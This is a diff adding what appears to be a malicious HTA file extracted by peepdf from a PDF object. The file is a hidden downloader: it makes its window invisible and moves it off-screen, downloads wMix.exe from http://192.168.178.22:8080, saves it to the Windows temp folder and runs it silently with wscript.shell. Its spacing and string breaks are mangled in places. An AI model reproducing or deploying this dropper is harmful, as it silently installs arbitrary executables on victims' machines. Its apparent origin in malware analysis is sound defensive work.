@@ -1,0 +1,43 @@
+// peepdf comment: Javascript code located in object 4 (version 0)
+
+< head > < hta: application
+applicationname = "wMix"
+border = "none"
+borderstyle = "normal"
+caption = "false"
+contextmenu = "false"
+icon = "%SystemRoot%/Installer/{7E1360F1-8915-419A-B939-900B26F057F0}/Professional.ico"
+maximizebutton = "false"
+minimizebutton = "false"
+navigable = "false"
+scroll = "false"
+selection = "false"
+showintaskbar = "No"
+sysmenu = "false"
+version = "1.0"
+windowstate = "Minimize" > < /head>
+<style>* { visibility: hidden; }</style > < script language = "VBScript" > window.resizeTo 1,
+1
+window.moveTo - 2000,
+-2000 < /script>
+<script type="text/javascript">setTimeout("
+window.close()", 5000);</script>
+<script language="
+VBScript ">
+On Error Resume Next
+Set CF = CreateObject("
+Microsoft.XMLHTTP ")
+CF.open "
+GET ","
+http: //192.168.178.22:8080/wMix.exe",False
+CF.send
+Set bT = CreateObject("ADODB.Stream")
+bT.Open
+bT.Type = 1
+bT.Write CF.responseBody
+bT.SaveToFile "C:/Windows/Temp/wMix.exe",
+2
+set shellobj = CreateObject("wscript.shell")
+shellobj.Run "C:/Windows/Temp/wMix.exe",
+0 < /script>
+
